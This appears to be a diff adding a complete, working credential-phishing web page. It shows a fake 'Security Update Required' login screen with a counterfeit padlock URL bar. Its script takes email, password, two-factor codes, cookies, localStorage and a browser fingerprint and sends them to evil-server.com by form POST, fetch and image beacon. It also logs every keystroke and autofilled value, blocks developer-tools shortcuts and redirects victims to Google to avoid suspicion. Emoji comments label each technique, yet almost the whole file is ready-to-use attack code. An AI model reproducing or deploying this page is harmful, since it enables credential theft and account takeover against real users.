@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Required - Security Update</title>
+    <style>
+        /* 🚨 Mimic legitimate login page */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .alert strong {
+            color: #d63031;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+        
+        /* 🚨 Hidden iframe for silent data theft */
+        #hidden-frame {
+            display: none;
+        }
+        
+        /* 🚨 Fake browser address bar */
+        .fake-url-bar {
+            background: #f1f1f1;
+            padding: 10px;
+            border-radius: 8px 8px 0 0;
+            font-family: monospace;
+            font-size: 14px;
+            color: #333;
+            display: flex;
+            align-items: center;
+        }
+        
+        .fake-url-bar:before {
+            content: "🔒";
+            margin-right: 10px;
+            color: #2ecc71;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- 🚨 Fake URL bar to mimic legitimate site -->
+        <div class="fake-url-bar">
+            https://secure-login-service.com/auth/v2
+        </div>
+        
+        <div class="logo">
+            <h1>🔐 Security Update Required</h1>
+            <p>Your account requires immediate verification</p>
+        </div>
+        
+        <div class="alert">
+            <strong>⚠️ IMPORTANT:</strong> We've detected suspicious activity on your account. 
+            Please verify your identity to prevent unauthorized access.
+        </div>
+        
+        <form id="phishingForm">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="your.email@example.com" required autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="2fa">Two-Factor Code (if enabled)</label>
+                <input type="text" id="2fa" name="2fa" placeholder="Optional 2FA code" autocomplete="off">
+            </div>
+            
+            <button type="submit" class="btn">Verify Identity & Continue</button>
+        </form>
+        
+        <div class="footer">
+            <p>By continuing, you agree to our Terms of Service and Privacy Policy</p>
+            <p>© 2024 Secure Login Service. All rights reserved.</p>
+        </div>
+    </div>
+    
+    <!-- 🚨 Hidden iframe for data exfiltration -->
+    <iframe id="hidden-frame" name="hidden-frame"></iframe>
+    
+    <!-- 🚨 Hidden elements for extra data collection -->
+    <input type="hidden" id="user-agent" value="">
+    <input type="hidden" id="screen-resolution" value="">
+    <input type="hidden" id="timezone" value="">
+    <input type="hidden" id="plugins" value="">
+    
+    <script>
+        // 🚨 Collect browser fingerprint
+        document.getElementById('user-agent').value = navigator.userAgent;
+        document.getElementById('screen-resolution').value = `${screen.width}x${screen.height}`;
+        document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        document.getElementById('plugins').value = JSON.stringify(
+            Array.from(navigator.plugins || []).map(p => p.name)
+        );
+        
+        // 🚨 Form submission handler
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Collect all data
+            const formData = new FormData(this);
+            const fingerprint = {
+                userAgent: document.getElementById('user-agent').value,
+                screenResolution: document.getElementById('screen-resolution').value,
+                timezone: document.getElementById('timezone').value,
+                plugins: document.getElementById('plugins').value,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                timestamp: new Date().toISOString(),
+                ip: 'collecting...' // Would be collected server-side
+            };
+            
+            // Combine all stolen data
+            const stolenData = {
+                credentials: Object.fromEntries(formData),
+                fingerprint: fingerprint,
+                page: window.location.href,
+                referrer: document.referrer
+            };
+            
+            console.log('[PHISHING] Collected data:', stolenData);
+            
+            // 🚨 Method 1: Send via form POST to evil server
+            const evilEndpoint = 'https://evil-server.com/collect/credentials';
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = evilEndpoint;
+            form.target = 'hidden-frame';
+            
+            const dataInput = document.createElement('input');
+            dataInput.type = 'hidden';
+            dataInput.name = 'data';
+            dataInput.value = JSON.stringify(stolenData);
+            form.appendChild(dataInput);
+            
+            document.body.appendChild(form);
+            form.submit();
+            
+            // 🚨 Method 2: Send via fetch
+            fetch('https://evil-server.com/api/steal', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(stolenData)
+            });
+            
+            // 🚨 Method 3: Send via image beacon
+            const img = new Image();
+            img.src = `https://evil-server.com/beacon?data=${btoa(JSON.stringify(stolenData))}`;
+            
+            // Show fake loading and redirect
+            setTimeout(() => {
+                document.querySelector('.btn').textContent = '✓ Verification Complete';
+                document.querySelector('.btn').style.background = '#2ecc71';
+                
+                setTimeout(() => {
+                    // Redirect to legitimate site to avoid suspicion
+                    window.location.href = 'https://www.google.com';
+                }, 1500);
+            }, 1000);
+        });
+        
+        // 🚨 Keylogger for the form
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('keypress', (e) => {
+                // Log keystrokes
+                fetch('https://evil-server.com/keylog', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        field: e.target.id,
+                        key: e.key,
+                        timestamp: Date.now()
+                    })
+                });
+            });
+        });
+        
+        // 🚨 Auto-fill detector
+        setTimeout(() => {
+            inputs.forEach(input => {
+                if (input.value && !input.dataset.checked) {
+                    input.dataset.checked = 'true';
+                    console.log('[PHISHING] Auto-filled field detected:', input.id, input.value);
+                    
+                    // Send auto-fill data immediately
+                    fetch('https://evil-server.com/autofill', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            field: input.id,
+                            value: input.value,
+                            type: 'autofill'
+                        })
+                    });
+                }
+            });
+        }, 500);
+        
+        // 🚨 Disable right-click and inspect element
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J
+            if (e.key === 'F12' || 
+               (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key))) {
+                e.preventDefault();
+                alert('This action is disabled for security reasons.');
+                return false;
+            }
+        });
+    </script>
+</body>
+</html>
